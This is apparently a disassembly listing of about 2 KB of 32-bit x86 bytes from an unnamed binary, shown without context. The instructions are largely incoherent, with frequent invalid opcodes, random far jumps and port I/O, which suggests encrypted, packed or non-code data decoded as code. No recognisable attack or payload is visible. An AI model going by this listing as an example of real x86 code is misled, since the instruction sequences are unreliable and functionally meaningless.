  41da17:	and    eax,0x9bff7080
  41da1c:	imul   ebp,DWORD PTR [edx],0xffffffb4
  41da1f:	jl     0x41d9a8
  41da21:	mov    cl,0x60
  41da23:	pop    ebp
  41da24:	mov    ebp,0x54ae6db0
  41da29:	inc    edx
  41da2a:	stos   DWORD PTR es:[edi],eax
  41da2b:	shr    edi,cl
  41da2d:	mov    esi,0x92cbc4ea
  41da32:	fnstsw WORD PTR [ebp+0x595c9f8a]
  41da38:	(bad)  
  41da39:	out    dx,eax
  41da3a:	ins    BYTE PTR es:[edi],dx
  41da3b:	mov    BYTE PTR [ebx],dl
  41da3d:	arpl   WORD PTR [ebx],di
  41da3f:	(bad)  
  41da40:	lock cwde 
  41da42:	cli    
  41da43:	stc    
  41da44:	pusha  
  41da45:	scas   al,BYTE PTR es:[edi]
  41da46:	shl    dh,1
  41da48:	sbb    edx,ecx
  41da4a:	imul   edi,DWORD PTR [ebx],0x68f066dc
  41da50:	repz int3 
  41da52:	mul    eax
  41da54:	add    cl,BYTE PTR [edx]
  41da56:	fwait
  41da57:	shl    edx,cl
  41da59:	cmp    ebp,DWORD PTR [esi+0x357f85c6]
  41da5f:	mov    eax,ds:0x33b39e5e
  41da64:	and    eax,0x58cc964c
  41da69:	je     0x41da05
  41da6b:	ds push 0x19105a77
  41da71:	loope  0x41da00
  41da73:	aas    
  41da74:	inc    ecx
  41da75:	lods   al,BYTE PTR ds:[esi]
  41da76:	ins    DWORD PTR es:[edi],dx
  41da77:	adc    eax,0xc16a596c
  41da7c:	or     DWORD PTR [ecx+esi*1+0x4ae7ac06],0x23
  41da84:	sbb    eax,0xf37687e7
  41da89:	and    al,BYTE PTR [edi-0x3d0e3376]
  41da8f:	lods   al,BYTE PTR ds:[esi]
  41da90:	outs   dx,BYTE PTR ds:[esi]
  41da91:	mov    edi,0xe586b295
  41da96:	call   0x5cfbc79b
  41da9b:	test   al,0xc3
  41da9d:	or     al,0xf6
  41da9f:	ss mov ecx,0x963613a8
  41daa5:	lahf   
  41daa6:	push   ecx
  41daa7:	push   cs
  41daa8:	pushf  
  41daa9:	xlat   BYTE PTR ds:[ebx]
  41daaa:	into   
  41daab:	loop   0x41dac0
  41daad:	sbb    eax,0xe837b8fe
  41dab2:	xor    ah,ch
  41dab4:	sbb    bh,BYTE PTR [eax-0x2218b988]
  41daba:	push   eax
  41dabb:	hlt    
  41dabc:	pop    edi
  41dabd:	ret    0x314a
  41dac0:	inc    esi
  41dac1:	sbb    DWORD PTR [edi+0x4a3903e3],edi
  41dac7:	xor    cl,BYTE PTR [edi+0x4b4a2361]
  41dacd:	sub    eax,0x3397c0bd
  41dad2:	rcl    BYTE PTR [esi+0x76],1
  41dad5:	add    esi,DWORD PTR [ebp-0x56f008e0]
  41dadb:	(bad)  
  41dadc:	mov    eax,0x52be57ea
  41dae1:	jl     0x41daab
  41dae3:	sub    eax,0x3fe9c488
  41dae8:	mov    cl,0xab
  41daea:	pop    ebp
  41daeb:	push   es
  41daec:	in     eax,0x29
  41daee:	pusha  
  41daef:	mov    bh,0xdb
  41daf1:	cld    
  41daf2:	jecxz  0x41db6d
  41daf4:	dec    ebp
  41daf5:	icebp  
  41daf6:	mov    ecx,0x87521d4f
  41dafb:	in     al,0x77
  41dafd:	pop    ds
  41dafe:	jo     0x41db28
  41db00:	push   eax
  41db01:	cs jmp 0x41dafc
  41db04:	aaa    
  41db05:	pop    edx
  41db06:	xchg   edx,eax
  41db07:	pop    edi
  41db08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db09:	aas    
  41db0a:	mov    cl,0xc0
  41db0c:	push   edx
  41db0d:	add    BYTE PTR [esi-0xa5c4d5a],al
  41db13:	adc    BYTE PTR [ebx+ecx*4],cl
  41db16:	xchg   BYTE PTR [ecx-0x6db0ba42],ch
  41db1c:	scas   al,BYTE PTR es:[edi]
  41db1d:	(bad)
  41db20:	out    dx,al
  41db21:	lds    edx,FWORD PTR [edi-0x73]
  41db24:	js     0x41db56
  41db26:	test   eax,0x4aaaa709
  41db2b:	ret    0x4f22
  41db2e:	and    esp,ebx
  41db30:	or     edi,DWORD PTR [ebx]
  41db32:	sti    
  41db33:	or     BYTE PTR [ecx-0x28aa8067],dh
  41db39:	mov    edx,0xf0497714
  41db3e:	out    0xa,al
  41db40:	and    ecx,ecx
  41db42:	push   esi
  41db43:	pop    ss
  41db44:	push   esp
  41db45:	inc    edi
  41db46:	jecxz  0x41daf9
  41db48:	inc    edx
  41db49:	out    0x32,eax
  41db4b:	psubsw mm0,QWORD PTR [edx-0x3103bc05]
  41db52:	adc    eax,0x49a95b16
  41db57:	or     eax,esi
  41db59:	ins    DWORD PTR es:[edi],dx
  41db5a:	mov    ch,bh
  41db5c:	mov    dh,0x2e
  41db5e:	call   0x15fa:0x437361c7
  41db65:	fiadd  DWORD PTR [esi-0x39]
  41db68:	and    edi,edx
  41db6a:	lea    ebx,[ecx+ebp*2-0x7d]
  41db6e:	xchg   edx,eax
  41db6f:	sub    al,0xe9
  41db71:	lods   al,BYTE PTR ds:[esi]
  41db72:	ins    DWORD PTR es:[edi],dx
  41db73:	mov    ebx,0xf0e48c22
  41db78:	inc    ebp
  41db79:	mov    ch,0xf4
  41db7b:	rcr    DWORD PTR [bp+si-0x69],cl
  41db7f:	inc    eax
  41db80:	gs or  eax,0x4ac60070
  41db86:	xor    BYTE PTR [eax-0x24],al
  41db89:	xchg   dl,ah
  41db8b:	or     esp,DWORD PTR [edx]
  41db8d:	dec    esi
  41db8e:	push   edx
  41db8f:	test   ebx,edi
  41db91:	mov    ch,BYTE PTR [edx+0x76]
  41db94:	jae    0x41db8a
  41db96:	xor    DWORD PTR [esi-0x3f],esp
  41db99:	xor    ebx,ecx
  41db9b:	sbb    al,0x7b
  41db9d:	repz leave 
  41db9f:	js     0x41db2a
  41dba1:	test   esi,edx
  41dba3:	std    
  41dba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dba5:	mov    eax,0x83dd1401
  41dbaa:	mov    edi,0x97100071
  41dbaf:	mov    dl,0xac
  41dbb1:	test   ebx,0x513bd45b
  41dbb7:	add    eax,0x8128522a
  41dbbc:	sahf   
  41dbbd:	jecxz  0x41dbb3
  41dbbf:	cld    
  41dbc0:	dec    eax
  41dbc1:	sbb    ebp,DWORD PTR [eax+0x72]
  41dbc4:	cmp    eax,0xbba8c8f5
  41dbc9:	imul   esp,DWORD PTR [ebp+0xd],0x3d
  41dbcd:	gs push esi
  41dbcf:	in     al,dx
  41dbd0:	aam    0xd9
  41dbd2:	add    ch,ah
  41dbd4:	stos   BYTE PTR es:[edi],al
  41dbd5:	fiadd  DWORD PTR [ebx+0x7431c4eb]
  41dbdb:	call   0xb593d66f
  41dbe0:	mov    WORD PTR [esi],gs
  41dbe2:	fst    DWORD PTR [ecx-0x5]
  41dbe5:	dec    edx
  41dbe6:	data16 stc 
  41dbe8:	or     eax,0x6811e67a
  41dbed:	ds or  edi,esi
  41dbf0:	mov    esi,0xba923482
  41dbf5:	sub    DWORD PTR [ecx],edi
  41dbf7:	dec    edx
  41dbf8:	adc    esp,DWORD PTR [ebx]
  41dbfa:	popa   
  41dbfb:	add    al,0x3b
  41dbfd:	mov    dl,0x80
  41dbff:	add    ah,0xbd
  41dc02:	xchg   ecx,eax
  41dc03:	add    eax,0x86d84151
  41dc08:	and    BYTE PTR [eax-0x28],dl
  41dc0b:	repz xor eax,DWORD PTR [ecx]
  41dc0e:	ds sbb bl,dh
  41dc11:	pop    ebp
  41dc12:	dec    edx
  41dc13:	sbb    ebx,ecx
  41dc15:	dec    ebp
  41dc16:	out    0x65,eax
  41dc18:	pop    esp
  41dc19:	sbb    bl,BYTE PTR [esi-0x9]
  41dc1c:	idiv   BYTE PTR [edi-0x427c5cc6]
  41dc22:	fldenv [ebp+0x7732eeb8]
  41dc28:	in     eax,dx
  41dc29:	addr16 jnp 0x41dbae
  41dc2c:	cs (bad) 
  41dc2e:	cwde   
  41dc2f:	out    0xc6,eax
  41dc31:	pushf  
  41dc32:	stos   BYTE PTR es:[edi],al
  41dc33:	push   0x3a
  41dc35:	xor    cl,dl
  41dc37:	dec    esi
  41dc38:	push   ds
  41dc39:	push   ecx
  41dc3a:	pop    esp
  41dc3b:	loopne 0x41dbcc
  41dc3d:	jge    0x41dc25
  41dc3f:	jge    0x41dbec
  41dc41:	mov    ?,ebx
  41dc43:	add    DWORD PTR [ebx+edx*4+0x1c],ebp
  41dc47:	jge    0x41dc92
  41dc49:	xchg   ecx,eax
  41dc4a:	ret    0xfbf5
  41dc4d:	mov    ebp,0x8c5d1efb
  41dc52:	xchg   ebp,eax
  41dc53:	scas   al,BYTE PTR es:[edi]
  41dc54:	aaa    
  41dc55:	ja     0x41dbf7
  41dc57:	cmc    
  41dc58:	hlt    
  41dc59:	(bad)  
  41dc5b:	adc    DWORD PTR [edx+0x42],esi
  41dc5e:	push   eax
  41dc5f:	mov    al,ds:0x706dd6d
  41dc64:	aas    
  41dc65:	jne    0x41dc0c
  41dc67:	mov    dh,0x41
  41dc69:	rol    DWORD PTR [eax+0x50159a40],0x18
  41dc70:	pslld  mm2,QWORD PTR [ebx+0x1c]
  41dc74:	pop    edx
  41dc75:	lea    esi,gs:[ebx+eax*1]
  41dc79:	repz call 0x5682f52f
  41dc7f:	test   al,0x8b
  41dc81:	test   al,0xeb
  41dc83:	dec    ecx
  41dc84:	js     0x41dc9e
  41dc86:	xchg   ebx,eax
  41dc87:	cmp    BYTE PTR [esi-0x7d],bh
  41dc8a:	cmp    esp,DWORD PTR ds:0x45fd0e21
  41dc90:	jb     0x41dc46
  41dc92:	rcl    BYTE PTR ss:[ebx+ecx*1-0x6f],1
  41dc97:	in     al,0x2
  41dc99:	push   cs
  41dc9a:	adc    al,0x91
  41dc9c:	dec    esi
  41dc9d:	xor    esi,DWORD PTR [ebx+0x1f0b1664]
  41dca3:	jge    0x41dcfd
  41dca5:	jge    0x41dcdb
  41dca7:	cmp    al,0xc3
  41dca9:	adc    ebx,DWORD PTR [ecx+0x55dc3398]
  41dcaf:	call   0xc245:0x1e133ea8
  41dcb6:	sti    
  41dcb7:	popf   
  41dcb8:	pop    edi
  41dcb9:	and    DWORD PTR ss:[ecx],edx
  41dcbc:	dec    ecx
  41dcbd:	jb     0x41dce2
  41dcbf:	in     al,0xd8
  41dcc1:	lock test DWORD PTR [eax],ecx
  41dcc4:	inc    ebx
  41dcc6:	pop    ebx
  41dcc7:	push   es
  41dcc8:	sub    al,0x4e
  41dcca:	cs xor eax,0x60ad01c4
  41dcd0:	mov    eax,0x581a546e
  41dcd5:	test   BYTE PTR [esi-0x46],cl
  41dcd8:	lods   eax,DWORD PTR ds:[esi]
  41dcd9:	sbb    DWORD PTR [eax+0x7d],eax
  41dcdc:	mov    ebp,0x3af9a81b
  41dce1:	mov    ebx,DWORD PTR [esi-0xc]
  41dce4:	push   ss
  41dce5:	std    
  41dce6:	or     DWORD PTR [ebp+0x1d],0xffffffa0
  41dcea:	jmp    FWORD PTR [ecx]
  41dcec:	add    BYTE PTR [ecx+0x8],0xa
  41dcf0:	retf   0xecd5
  41dcf3:	call   0x9795:0xb189eb6
  41dcfa:	fsub   DWORD PTR gs:[ebx+eax*2]
  41dcfe:	or     edi,DWORD PTR [eax+0x15]
  41dd01:	mov    esp,0xb94c8d99
  41dd06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd07:	xor    DWORD PTR [ecx-0x70],ebx
  41dd0a:	lods   eax,DWORD PTR ds:[esi]
  41dd0b:	mov    eax,0x3f190525
  41dd10:	pop    ebx
  41dd11:	sbb    BYTE PTR [ebp+0x1c],cl
  41dd14:	sar    DWORD PTR [eax+0x14],cl
  41dd17:	outs   dx,BYTE PTR ds:[esi]
  41dd18:	mov    cl,0x55
  41dd1a:	add    dl,0x21
  41dd1d:	mov    dh,0xd0
  41dd1f:	mov    ah,0xcc
  41dd21:	cdq    
  41dd22:	sbb    dh,BYTE PTR [edx+esi*1-0x26]
  41dd26:	xchg   ebx,eax
  41dd27:	repz int 0x9a
  41dd2a:	add    eax,0xcc54b73a
  41dd2f:	sub    al,0x96
  41dd31:	sbb    ebp,DWORD PTR [eax+0x39]
  41dd34:	sbb    BYTE PTR [edi],dh
  41dd36:	mov    DWORD PTR [edx],esp
  41dd38:	pop    ss
  41dd39:	inc    ebp
  41dd3a:	cmp    eax,0x4d0e4fdb
  41dd3f:	adc    DWORD PTR [edi+0x73],esp
  41dd42:	push   ds
  41dd43:	mov    ds:0xd4031b5e,al
  41dd48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd49:	arpl   ax,bx
  41dd4b:	mov    BYTE PTR ds:0x19f0e6ef,dh
  41dd51:	jg     0x41dd6e
  41dd53:	xchg   ecx,eax
  41dd54:	retf   0xf54f
  41dd57:	out    dx,al
  41dd58:	fsubr  QWORD PTR [ecx-0x66595ca2]
  41dd5e:	xlat   BYTE PTR ds:[ebx]
  41dd5f:	jp     0x41dd9e
  41dd61:	mov    eax,ds:0x773cb5ca
  41dd66:	xor    eax,esp
  41dd68:	pop    ebx
  41dd69:	mov    ah,0x6e
  41dd6b:	ja     0x41dd2e
  41dd6d:	jo     0x41dd80
  41dd6f:	mov    esp,0xabb7cced
  41dd74:	dec    eax
  41dd75:	mov    bh,0x8a
  41dd77:	(bad)  
  41dd78:	addr16 push edx
  41dd7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd7b:	xor    cl,dl
  41dd7d:	pop    esi
  41dd7e:	retf   
  41dd7f:	or     al,0x5e
  41dd81:	jmp    0x41dd3b
  41dd83:	(bad)  
  41dd84:	pusha  
  41dd85:	push   0x2a
  41dd87:	fmul   DWORD PTR [esi+0x48]
  41dd8a:	pop    ebx
  41dd8b:	je     0x41ddf5
  41dd8d:	or     DWORD PTR [ecx+0x24],edi
  41dd90:	add    BYTE PTR [ebx],bh
  41dd92:	jle    0x41dd41
  41dd94:	mov    esi,0xc66529a
  41dd99:	and    BYTE PTR [esi],dl
  41dd9b:	inc    ebp
  41dd9c:	out    0xc,al
  41dd9e:	(bad)
  41dda1:	dec    esp
  41dda2:	out    dx,eax
  41dda3:	stos   BYTE PTR es:[edi],al
  41dda4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dda5:	inc    ecx
  41dda6:	jb     0x41ddb0
  41dda8:	push   ebx
  41dda9:	push   eax
  41ddaa:	and    al,0xe8
  41ddac:	jbe    0x41dd73
  41ddae:	cmp    ebp,edx
  41ddb0:	in     eax,0x31
  41ddb2:	retf   0xbc29
  41ddb5:	lahf   
  41ddb6:	dec    edx
  41ddb7:	push   ecx
  41ddb8:	inc    edi
  41ddb9:	push   ss
  41ddba:	aas    
  41ddbb:	xlat   BYTE PTR ds:[ebx]
  41ddbc:	not    BYTE PTR [ebx+0x1bac75b0]
  41ddc2:	shl    BYTE PTR [eax],0xd9
  41ddc5:	test   BYTE PTR [edx-0x12],ah
  41ddc8:	jge    0x41dd4c
  41ddca:	lds    edi,FWORD PTR [edi-0x19]
  41ddcd:	push   cs
  41ddce:	call   0x68de:0xef7f4537
  41ddd5:	mov    bh,0x9e
  41ddd7:	(bad)  
  41ddd8:	mov    dl,0x9a
  41ddda:	dec    ebx
  41dddb:	xchg   DWORD PTR [esp+esi*8+0x6b],esi
  41dddf:	inc    ebp
  41dde0:	int3   
  41dde1:	mov    ds:0x4c22cc88,al
  41dde6:	adc    BYTE PTR [ecx+0x78b9530a],al
  41ddec:	and    eax,0x3719c472
  41ddf1:	outs   dx,DWORD PTR ds:[esi]
  41ddf2:	repnz jecxz 0x41ddfb
  41ddf5:	stos   BYTE PTR es:[edi],al
  41ddf6:	mov    al,0x61
  41ddf8:	mov    dh,0x81
  41ddfa:	int    0xd0
  41ddfc:	add    al,0x6f
  41ddfe:	pusha  
  41ddff:	out    0x3a,eax
  41de01:	dec    eax
  41de02:	stc    
  41de03:	fcom   st(1)
  41de05:	ficom  DWORD PTR [eax-0x38]
  41de08:	ins    BYTE PTR es:[edi],dx
  41de09:	or     eax,0xed60bad1
  41de0e:	fs (bad) 
  41de10:	int    0xdd
  41de12:	std    
  41de13:	push   edx
  41de14:	sbb    BYTE PTR [edi],bl
  41de16:	sub    al,0x8c
  41de18:	push   ebx
  41de19:	in     al,dx
  41de1a:	mov    ah,0x59
  41de1c:	jno    0x41de35
  41de1e:	mov    ds:0x6e069c63,eax
  41de23:	add    eax,0xa9e77083
  41de28:	ret    
  41de29:	pop    ecx
  41de2a:	cmc    
  41de2b:	mov    dl,0xa8
  41de2d:	xor    edx,DWORD PTR [edi+0x0]
  41de30:	scas   al,BYTE PTR es:[edi]
  41de31:	repz sub edx,DWORD PTR [edi]
  41de34:	nop
  41de35:	mov    al,ds:0xa510fbf2
  41de3a:	inc    ebx
  41de3b:	sar    BYTE PTR [ebx-0x55957d2],1
  41de41:	adc    DWORD PTR [edx-0x9],0xd62b1b13
  41de48:	jle    0x41de69
  41de4a:	adc    eax,0xdc82891d
  41de4f:	dec    ebx
  41de50:	sub    bl,BYTE PTR [ebx-0x78c484a4]
  41de56:	mov    DWORD PTR [esi-0x70],ecx
  41de59:	push   ds
  41de5a:	in     eax,dx
  41de5b:	pop    eax
  41de5c:	leave  
  41de5d:	mov    eax,0x4591374b
  41de62:	ins    DWORD PTR es:[edi],dx
  41de63:	push   ecx
  41de64:	inc    edi
  41de65:	sbb    eax,0x4fbc5448
  41de6a:	pop    ebp
  41de6b:	(bad)  
  41de6c:	addr16 fs pop esi
  41de6f:	pop    es
  41de70:	in     al,dx
  41de71:	lahf   
  41de72:	retf   
  41de73:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de75:	inc    edi
  41de76:	pushf  
  41de77:	add    ecx,ebp
  41de79:	sub    ah,BYTE PTR [ebx+0x28c61310]
  41de7f:	jle    0x41de13
  41de81:	inc    edx
  41de82:	ds sbb al,0xda
  41de85:	out    dx,al
  41de86:	fmul   DWORD PTR ds:0x7076c7b9
  41de8c:	add    ecx,eax
  41de8e:	dec    ebp
  41de8f:	clc    
  41de90:	cld    
  41de91:	xchg   ecx,eax
  41de92:	mov    ebp,0xb309201c
  41de97:	sbb    eax,0x2e39cb9f
  41de9c:	inc    ebp
  41de9d:	clc    
  41de9e:	out    dx,eax
  41de9f:	shl    DWORD PTR [esp+eiz*2+0x8d7d687],0x6d
  41dea7:	push   cs
  41dea8:	fs cmp ebp,ebx
  41deab:	lds    ecx,FWORD PTR [esi+0x73]
  41deae:	mov    BYTE PTR [ecx-0x79],dh
  41deb1:	jp     0x41df1a
  41deb3:	loope  0x41de9e
  41deb5:	jo     0x41de8e
  41deb7:	jmp    0x37eb:0x634004a3
  41debe:	xor    eax,0x3561a976
  41dec3:	xchg   ecx,eax
  41dec4:	and    cl,BYTE PTR [ebp+0x2eb6336e]
  41deca:	jbe    0x41deea
  41decc:	pop    edx
  41decd:	es push 0x3b
  41ded0:	jno    0x41def6
  41ded2:	pop    ss
  41ded3:	jg     0x41df02
  41ded5:	imul   edi,DWORD PTR [ecx+0xdfbe672],0xffffffb3
  41dedc:	fbstp  TBYTE PTR [ecx-0x6e]
  41dedf:	pop    gs
  41dee1:	push   ebp
  41dee2:	cmp    cl,dh
  41dee4:	imul   ecx,ebx,0x32
  41dee7:	push   ebp
  41dee8:	test   bl,0x78
  41deeb:	pushf  
  41deec:	(bad)  
  41deed:	xchg   esp,eax
  41deee:	lock push esp
  41def0:	mov    ch,0xaf
  41def2:	adc    bh,BYTE PTR [eax]
  41def4:	test   DWORD PTR [edi+0x4d],ebx
  41def7:	addr16 jmp 0x41ded1
  41defa:	adc    ecx,DWORD PTR [esi+0xa4f39ea]
  41df00:	or     DWORD PTR [eax+0x52],0xc91fcf83
  41df07:	fcom   QWORD PTR [ebp+0x74542a7c]
  41df0d:	push   ebx
  41df0e:	mov    cl,0xa0
  41df10:	and    dl,BYTE PTR [eax+0x2396dfac]
  41df16:	inc    ebx
  41df17:	mov    esp,0x5c28ed84
  41df1c:	cmp    eax,0xf0ab9d9f
  41df21:	shl    ecx,cl
  41df23:	nop
  41df24:	mov    ecx,0x80930c79
  41df29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df2a:	jns    0x41ded7
  41df2c:	lahf   
  41df2d:	sub    cl,ah
  41df2f:	sub    al,0x20
  41df31:	xchg   ebp,eax
  41df32:	fldcw  WORD PTR [ebp-0x42020b4e]
  41df38:	inc    esi
  41df39:	ret    0x58a6
  41df3c:	pushf  
  41df3d:	adc    bl,cl
  41df3f:	pusha  
  41df40:	jle    0x41ded8
  41df42:	lock fcom QWORD PTR [ebp+0x59]
  41df46:	(bad)  
  41df47:	dec    esp
  41df48:	mov    ebx,0xb45c8ee9
  41df4d:	sub    ebx,DWORD PTR [ecx]
  41df4f:	cmp    bh,BYTE PTR [ebp-0x7bd289a0]
  41df55:	fcmovb st,st(5)
  41df57:	imul   edi,DWORD PTR ds:0xd55265c7,0xe
  41df5e:	xchg   esi,eax
  41df5f:	fstp   TBYTE PTR [eax-0x5b23ae1d]
  41df65:	test   eax,0xb5963fd3
  41df6a:	aam    0x52
  41df6c:	fsubr  DWORD PTR [edx+0x15042371]
  41df72:	xor    DWORD PTR [ebp+0x55],esp
  41df75:	imul   edi,DWORD PTR ds:0xd6f30b2b,0xa775c66d
  41df7f:	dec    DWORD PTR [ebx+0x1f0062bf]
  41df85:	or     ah,BYTE PTR [ebx+0x15]
  41df88:	stos   DWORD PTR es:[di],eax
  41df8a:	push   es
  41df8b:	pop    ds
  41df8c:	or     eax,0xe96d8d5d
  41df91:	and    dl,ah
  41df93:	dec    esp
  41df94:	ins    BYTE PTR es:[edi],dx
  41df95:	mov    BYTE PTR [ebx+ebx*1+0x45],ch
  41df99:	(bad)  
  41df9a:	push   edx
  41df9b:	mov    ah,0xdc
  41df9d:	sar    BYTE PTR [esi+0x336cbb55],1
  41dfa3:	dec    edx
  41dfa4:	xchg   DWORD PTR [si+0x4ec9],eax
  41dfa9:	push   0xb01bb980
  41dfae:	jmp    0x139a555f
  41dfb3:	aaa    
  41dfb4:	push   ebp
  41dfb5:	ret    
  41dfb6:	in     eax,0x4d
  41dfb8:	bound  edi,QWORD PTR [edi]
  41dfba:	push   esi
  41dfbb:	mov    ebp,0xf5022f89
  41dfc0:	js     0x41dfb4
  41dfc2:	lahf   
  41dfc3:	into   
  41dfc4:	add    BYTE PTR [esi-0x6ac373dc],al
  41dfca:	xor    dl,bl
  41dfcc:	xlat   BYTE PTR ds:[ebx]
  41dfcd:	dec    esi
  41dfce:	cmp    al,0xf6
  41dfd0:	and    DWORD PTR [ebx-0x3d],0xffffff89
  41dfd4:	ds pop ebx
  41dfd6:	scas   eax,DWORD PTR es:[edi]
  41dfd7:	or     al,0x50
  41dfd9:	jmp    0x7c5902e8
  41dfde:	cmc    
  41dfdf:	and    al,0xda
  41dfe1:	jecxz  0x41dfae
  41dfe3:	jnp    0x41dfed
  41dfe5:	add    eax,0xa7b55b75
  41dfea:	jg     0x41df95
  41dfec:	xor    ebx,DWORD PTR [edi]
  41dfee:	imul   DWORD PTR [ecx+0x1f]
  41dff1:	sahf   
  41dff2:	push   cs
  41dff3:	pavgb  mm4,QWORD PTR [eax-0x5f]
  41dff7:	pushf  
  41dff8:	mov    edi,0xe09bca05
  41dffd:	sbb    ah,BYTE PTR [ecx-0x9]
  41e000:	pop    es
  41e001:	retf   0x1da0
  41e004:	(bad)  
  41e005:	dec    ebp
  41e006:	jmp    0xedec:0x85eaf11f
  41e00d:	jo     0x41e009
  41e00f:	(bad)  
  41e010:	fst    DWORD PTR [esi+ecx*4]
  41e013:	dec    esi
  41e014:	mov    edi,0xb26f6f8d
  41e019:	xchg   DWORD PTR [edi+esi*1],esp
  41e01c:	cld    
  41e01d:	sbb    bh,0xe5
  41e020:	pop    edx
  41e021:	test   DWORD PTR [esi],eax
  41e023:	sub    al,0x44
  41e025:	xchg   ebp,eax
  41e026:	ficomp DWORD PTR [edx-0x63664786]
  41e02c:	xchg   esp,eax
  41e02d:	outs   dx,DWORD PTR ds:[esi]
  41e02e:	xchg   esp,eax
  41e02f:	and    esp,0xb60e987d
  41e035:	imul   esp,esp,0xd71d97f0
  41e03b:	xor    edx,edx
  41e03d:	ins    DWORD PTR es:[edi],dx
  41e03e:	jne    0x41e08b
  41e040:	push   cs
  41e041:	aaa    
  41e042:	rcr    DWORD PTR [eax+0x1e644e13],1
  41e048:	lods   eax,DWORD PTR ds:[esi]
  41e049:	fisttp DWORD PTR ds:0xa6bd30d9
  41e04f:	retf   0x63c5
  41e052:	retf   0xe3fa
  41e055:	jmp    0xc650efa
  41e05a:	push   edx
  41e05b:	pop    DWORD PTR [edi-0x6ab2bb10]
  41e061:	ss test eax,0x3a02f589
  41e067:	cmc    
  41e068:	cmp    eax,0x73a4578
  41e06d:	cmp    eax,0x8e266049
  41e072:	xchg   esp,eax
  41e073:	in     al,0x96
  41e075:	sub    eax,DWORD PTR [edi+0x66ee5294]
  41e07b:	and    esi,ebp
  41e07d:	lds    edx,FWORD PTR [eax+0x6a]
  41e080:	cmp    edx,ecx
  41e082:	test   eax,0xded26101
  41e087:	inc    esp
  41e088:	fnstsw ax
  41e08a:	pop    ebp
  41e08b:	sbb    DWORD PTR ds:0xc81a6b39,esi
  41e091:	jecxz  0x41e0fb
  41e093:	scas   al,BYTE PTR es:[edi]
  41e094:	push   ecx
  41e095:	mov    ah,0x5f
  41e097:	pop    edx
  41e098:	mov    ecx,0x7c6a2b2c
  41e09d:	mov    DWORD PTR [edi+ebp*2],ebp
  41e0a0:	pop    esp
  41e0a1:	dec    edx
  41e0a2:	mov    esi,0xb42f82df
  41e0a7:	adc    BYTE PTR [edi+0xb],bl
  41e0aa:	push   es
  41e0ab:	jmp    0xdbc16fcf
  41e0b0:	pop    es
  41e0b1:	or     DWORD PTR [ebx],edi
  41e0b3:	inc    edi
  41e0b4:	iret   
  41e0b5:	mov    esp,0x4f04a62b
  41e0ba:	pop    esp
  41e0bb:	inc    eax
  41e0bc:	mov    es,WORD PTR [edx]
  41e0be:	mov    edx,DWORD PTR [ecx-0x38]
  41e0c1:	jecxz  0x41e0de
  41e0c3:	inc    edx
  41e0c4:	fcmovbe st,st(0)
  41e0c6:	lods   al,BYTE PTR ds:[esi]
  41e0c7:	pushf  
  41e0c8:	(bad)  
  41e0c9:	icebp  
  41e0ca:	in     al,0x56
  41e0cc:	test   DWORD PTR [ecx+edi*2+0x13a5650d],ecx
  41e0d3:	nop
  41e0d4:	mov    esp,0xdf505ec2
  41e0d9:	jecxz  0x41e131
  41e0db:	je     0x41e05e
  41e0dd:	out    dx,eax
  41e0de:	xchg   ebx,eax
  41e0df:	mov    eax,ds:0xf36b84c3
  41e0e4:	aas    
  41e0e5:	retf   
  41e0e6:	cmp    edx,DWORD PTR [ecx+0x71351266]
  41e0ec:	sub    al,0x86
  41e0ee:	push   ebx
  41e0ef:	lods   al,BYTE PTR ds:[esi]
  41e0f0:	hlt    
  41e0f1:	and    esi,DWORD PTR [ebx]
  41e0f3:	sbb    eax,0x2849da5a
  41e0f8:	or     eax,0x1b5dd33d
  41e0fd:	(bad)  
  41e0fe:	test   eax,0x7e59cd5
  41e103:	enter  0xa798,0x10
  41e107:	cmp    DWORD PTR [esp+eax*4-0x868292e],esi
  41e10e:	inc    edx
  41e10f:	aaa    
  41e110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e111:	pop    ecx
  41e112:	add    ebx,DWORD PTR [eax]
  41e114:	mov    al,ds:0x8b241e7c
  41e119:	mov    al,ds:0x989b7525
  41e11e:	ficomp WORD PTR [ecx-0x1c]
  41e121:	jmp    0x41e179
  41e123:	dec    eax
  41e124:	mov    edx,0x87d8e1b
  41e129:	mov    dl,0x36
  41e12b:	leave  
  41e12c:	mov    ecx,0x93bcc5c2
  41e131:	cmp    al,0x32
  41e133:	ss aas 
  41e135:	and    ebx,DWORD PTR [ebp-0x12]
  41e138:	xor    eax,0x93b80e75
  41e13d:	mov    WORD PTR [eax],es
  41e13f:	(bad)  
  41e140:	sub    eax,0xac4db643
  41e145:	test   al,0x9a
  41e147:	adc    eax,0x255f52d2
  41e14c:	mov    ss,ebp
  41e14e:	aam    0x20
  41e150:	addr16 pushf 
  41e152:	stc    
  41e153:	dec    ebx
  41e154:	sub    ch,bl
  41e156:	jg     0x41e156
  41e158:	mov    ds:0xe53de5ec,al
  41e15d:	ja     0x41e1d2
  41e15f:	retf   0xfb05
  41e162:	imul   edi,DWORD PTR [edx-0x4b],0xb821f039
  41e169:	mov    ch,0x0
  41e16b:	cmp    ecx,ecx
  41e16d:	jmp    0x41e14a
  41e16f:	mov    ds:0x82579b61,eax
  41e174:	(bad)  
  41e175:	jmp    0x41e117
  41e177:	ja     0x41e187
  41e179:	cmp    edx,DWORD PTR [eax]
  41e17b:	mov    eax,0xa3cc82b2
  41e180:	pop    eax
  41e181:	adc    eax,0xf7e8f8a6
  41e186:	stos   DWORD PTR es:[edi],eax
  41e187:	iret   
  41e188:	lds    edx,FWORD PTR [edx]
  41e18a:	push   eax
  41e18b:	lds    edi,FWORD PTR [edi+0x28]
  41e18e:	xchg   ecx,eax
  41e18f:	mov    ebp,ebx
  41e191:	popf   
  41e192:	mov    eax,0xaa61d9ed
  41e197:	xchg   esp,eax
  41e198:	mov    edi,ecx
  41e19a:	xchg   edi,eax
  41e19b:	sub    cl,BYTE PTR [ebx-0x10]
  41e19e:	jnp    0x41e1a2
  41e1a0:	icebp  
  41e1a1:	inc    edi
  41e1a2:	repz cmp ch,BYTE PTR [ebp+0x3e783268]
